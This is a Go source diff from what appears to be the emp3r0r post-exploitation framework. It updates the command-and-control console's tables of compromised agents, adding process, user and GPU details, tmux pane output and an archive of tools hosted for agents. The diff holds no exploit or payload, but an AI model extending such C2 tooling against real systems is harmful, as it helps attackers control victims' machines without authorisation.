@@ -2,7 +2,6 @@ package cc
 
 import (
 	"encoding/json"
-	"errors"
 	"fmt"
 	"io/ioutil"
 	"os"
@@ -10,7 +9,7 @@ import (
 	"sync"
 
 	"github.com/fatih/color"
-	"github.com/jm33-m0/emp3r0r/core/lib/agent"
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/olekukonko/tablewriter"
@@ -19,8 +18,8 @@ import (
 
 var (
 	// DebugLevel what kind fof logs do we want to see
-	// 0 (INFO) -> 1 (WARN) -> 2 (ERROR)
-	DebugLevel = 0
+	// 3 (DEBUG) -> 2 (INFO) -> 1 (WARN)
+	DebugLevel = 2
 
 	// IsAPIEnabled Indicate whether we are in headless mode
 	IsAPIEnabled = false
@@ -29,7 +28,7 @@ var (
 	EmpRoot, _ = os.Getwd()
 
 	// Targets target list, with control (tun) interface
-	Targets = make(map[*agent.SystemInfo]*Control)
+	Targets = make(map[*emp3r0r_data.SystemInfo]*Control)
 )
 
 const (
@@ -38,6 +37,9 @@ const (
 
 	// WWWRoot host static files for agent
 	WWWRoot = Temp + tun.FileAPI
+
+	// UtilsArchive host utils.tar.bz2 for agent
+	UtilsArchive = WWWRoot + "utils.tar.bz2"
 
 	// FileGetDir where we save #get files
 	FileGetDir = "file-get/"
@@ -52,7 +54,7 @@ type Control struct {
 
 // send JSON encoded target list to frontend
 func headlessListTargets() (err error) {
-	var targets []agent.SystemInfo
+	var targets []emp3r0r_data.SystemInfo
 	for target := range Targets {
 		targets = append(targets, *target)
 	}
@@ -102,14 +104,11 @@ func ListTargets() {
 		}
 	}
 
-	color.Cyan("Connected agents\n")
-	color.Cyan("=================\n\n")
-
 	// build table
 	tdata := [][]string{}
 	tableString := &strings.Builder{}
 	table := tablewriter.NewWriter(tableString)
-	table.SetHeader([]string{"Index", "Label", "Tag", "OS", "IPs", "From"})
+	table.SetHeader([]string{"Index", "Label", "Tag", "OS", "Process", "User", "IPs", "From"})
 	table.SetBorder(true)
 	table.SetRowLine(true)
 	table.SetAutoWrapText(true)
@@ -117,47 +116,80 @@ func ListTargets() {
 	table.SetReflowDuringAutoWrap(true)
 
 	// color
-	table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiMagentaColor},
-		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiCyanColor},
-		tablewriter.Colors{tablewriter.Bold, tablewriter.FgBlueColor},
-		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiWhiteColor},
-		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiBlueColor},
-		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiYellowColor})
+	table.SetHeaderColor(
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiMagentaColor}, // index
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiMagentaColor}, // label
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgBlueColor},      // tag
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiWhiteColor},   // os
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiCyanColor},    // process
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiWhiteColor},   // user
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiBlueColor},    // from
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiYellowColor})  // IPs
 
-	table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiMagentaColor},
-		tablewriter.Colors{tablewriter.FgHiCyanColor},
-		tablewriter.Colors{tablewriter.FgBlueColor},
-		tablewriter.Colors{tablewriter.FgHiWhiteColor},
-		tablewriter.Colors{tablewriter.FgHiBlueColor},
-		tablewriter.Colors{tablewriter.FgYellowColor})
+	table.SetColumnColor(
+		tablewriter.Colors{tablewriter.FgHiMagentaColor}, // index
+		tablewriter.Colors{tablewriter.FgHiMagentaColor}, // label
+		tablewriter.Colors{tablewriter.FgBlueColor},      // tag
+		tablewriter.Colors{tablewriter.FgHiWhiteColor},   // os
+		tablewriter.Colors{tablewriter.FgHiCyanColor},    // process
+		tablewriter.Colors{tablewriter.FgHiWhiteColor},   // user
+		tablewriter.Colors{tablewriter.FgHiBlueColor},    // from
+		tablewriter.Colors{tablewriter.FgYellowColor})    // IPs
 
 	// fill table
 	for target, control := range Targets {
 		// print
 		if control.Label == "" {
-			control.Label = "-"
+			control.Label = "nolabel"
 		}
 		index := fmt.Sprintf("%d", control.Index)
 		label := control.Label
 
+		// agent process info
+		agentProc := *target.Process
+		procInfo := fmt.Sprintf("%s (%d)\n<- %s (%d)",
+			agentProc.Cmdline, agentProc.PID, agentProc.Parent, agentProc.PPID)
+
 		// info map
 		ips := strings.Join(target.IPs, ",\n")
 		infoMap := map[string]string{
-			"OS":   SplitLongLine(target.OS, 15),
-			"From": fmt.Sprintf("%s\nvia %s", target.IP, target.Transport),
-			"IPs":  ips,
+			"OS":      SplitLongLine(target.OS, 15),
+			"Process": SplitLongLine(procInfo, 15),
+			"User":    SplitLongLine(target.User, 15),
+			"From":    fmt.Sprintf("%s\nvia %s", target.IP, target.Transport),
+			"IPs":     ips,
 		}
 
-		var row = []string{index, label, SplitLongLine(target.Tag, 15), infoMap["OS"], infoMap["IPs"], infoMap["From"]}
+		var row = []string{index, label, SplitLongLine(target.Tag, 15),
+			infoMap["OS"], infoMap["Process"], infoMap["User"], infoMap["IPs"], infoMap["From"]}
+
+		// is this agent currently selected?
+		if CurrentTarget != nil {
+			if CurrentTarget.Tag == target.Tag {
+				index = color.New(color.FgHiGreen, color.Bold).Sprintf("%d", control.Index)
+				row = []string{index, label, SplitLongLine(target.Tag, 15),
+					infoMap["OS"], infoMap["Process"], infoMap["User"], infoMap["IPs"], infoMap["From"]}
+
+				// put this row at top
+				if len(tdata) > 0 {
+					temp := tdata[0]
+					tdata[0] = row
+					row = temp
+				}
+			}
+		}
+
 		tdata = append(tdata, row)
 	}
 	// rendor table
 	table.AppendBulk(tdata)
 	table.Render()
-	fmt.Printf("\n\033[0m%s\n\n", tableString)
+
+	// resize in case it gets wider
+	AgentListPane.TmuxPrintf(true, "\n\033[0m%s\n\n", tableString.String())
 }
 
-func GetTargetDetails(target *agent.SystemInfo) {
+func GetTargetDetails(target *emp3r0r_data.SystemInfo) {
 	// exists?
 	if !IsAgentExist(target) {
 		CliPrintError("Target does not exist")
@@ -190,6 +222,7 @@ func GetTargetDetails(target *agent.SystemInfo) {
 		userInfo = color.HiGreenString(target.User)
 	}
 	cpuinfo := color.HiMagentaString(target.CPU)
+	gpuinfo := color.HiMagentaString(target.GPU)
 
 	// agent process info
 	agentProc := *target.Process
@@ -198,11 +231,13 @@ func GetTargetDetails(target *agent.SystemInfo) {
 
 	// info map
 	infoMap := map[string]string{
+		"Version":   color.HiWhiteString(target.Version),
 		"Hostname":  color.HiCyanString(target.Hostname),
 		"Process":   color.HiMagentaString(procInfo),
 		"User":      userInfo,
 		"Internet":  hasInternet,
 		"CPU":       cpuinfo,
+		"GPU":       gpuinfo,
 		"MEM":       target.Mem,
 		"Hardware":  color.HiCyanString(target.Hardware),
 		"Container": target.Container,
@@ -227,14 +262,22 @@ func GetTargetDetails(target *agent.SystemInfo) {
 	for key, val := range infoMap {
 		tdata = append(tdata, []string{key, val})
 	}
+
 	// rendor table
 	table.AppendBulk(tdata)
 	table.Render()
-	fmt.Printf("\n\033[0m%s\n\n", tableString)
+	num_of_lines := len(strings.Split(tableString.String(), "\n"))
+	num_of_columns := len(strings.Split(tableString.String(), "\n")[0])
+	AgentInfoPane.TmuxResizePane("y", num_of_lines)
+	AgentInfoPane.TmuxResizePane("x", num_of_columns)
+	AgentInfoPane.TmuxPrintf(true, "\n\033[0m%s\n\n", tableString.String())
+
+	// Update Agent list
+	ListTargets()
 }
 
 // GetTargetFromIndex find target from Targets via control index, return nil if not found
-func GetTargetFromIndex(index int) (target *agent.SystemInfo) {
+func GetTargetFromIndex(index int) (target *emp3r0r_data.SystemInfo) {
 	for t, ctl := range Targets {
 		if ctl.Index == index {
 			target = t
@@ -245,7 +288,7 @@ func GetTargetFromIndex(index int) (target *agent.SystemInfo) {
 }
 
 // GetTargetFromTag find target from Targets via tag, return nil if not found
-func GetTargetFromTag(tag string) (target *agent.SystemInfo) {
+func GetTargetFromTag(tag string) (target *emp3r0r_data.SystemInfo) {
 	for t := range Targets {
 		if t.Tag == tag {
 			target = t
@@ -268,7 +311,7 @@ func labelAgents() {
 		labeledAgents []LabeledAgent
 		old           []LabeledAgent
 	)
-	// what if agent.json already have some records
+	// what if emp3r0r_data.json already have some records
 	if util.IsFileExist(AgentsJSON) {
 		data, err := ioutil.ReadFile(AgentsJSON)
 		if err != nil {
@@ -321,7 +364,7 @@ outter:
 }
 
 // SetAgentLabel if an agent is already labeled, we can set its label in later sessions
-func SetAgentLabel(a *agent.SystemInfo, mutex *sync.Mutex) (label string) {
+func SetAgentLabel(a *emp3r0r_data.SystemInfo, mutex *sync.Mutex) (label string) {
 	data, err := ioutil.ReadFile(AgentsJSON)
 	if err != nil {
 		CliPrintWarning("SetAgentLabel: %v", err)
@@ -338,7 +381,9 @@ func SetAgentLabel(a *agent.SystemInfo, mutex *sync.Mutex) (label string) {
 		if a.Tag == labeled.Tag {
 			mutex.Lock()
 			defer mutex.Unlock()
-			Targets[a].Label = labeled.Label
+			if Targets[a] != nil {
+				Targets[a].Label = labeled.Label
+			}
 			label = labeled.Label
 			return
 		}
@@ -349,14 +394,17 @@ func SetAgentLabel(a *agent.SystemInfo, mutex *sync.Mutex) (label string) {
 
 // ListModules list all available modules
 func ListModules() {
-	CliPrettyPrint("Module Name", "Help", &agent.ModuleDocs)
+	CliPrettyPrint("Module Name", "Help", &emp3r0r_data.ModuleComments)
 }
 
 // Send2Agent send MsgTunData to agent
-func Send2Agent(data *agent.MsgTunData, agent *agent.SystemInfo) (err error) {
+func Send2Agent(data *emp3r0r_data.MsgTunData, agent *emp3r0r_data.SystemInfo) (err error) {
 	ctrl := Targets[agent]
 	if ctrl == nil {
-		return errors.New("Send2Agent: Target is not connected")
+		return fmt.Errorf("Send2Agent (%s): Target is not connected", data.Payload)
+	}
+	if ctrl.Conn == nil {
+		return fmt.Errorf("Send2Agent (%s): Target is not connected", data.Payload)
 	}
 	out := json.NewEncoder(ctrl.Conn)
 
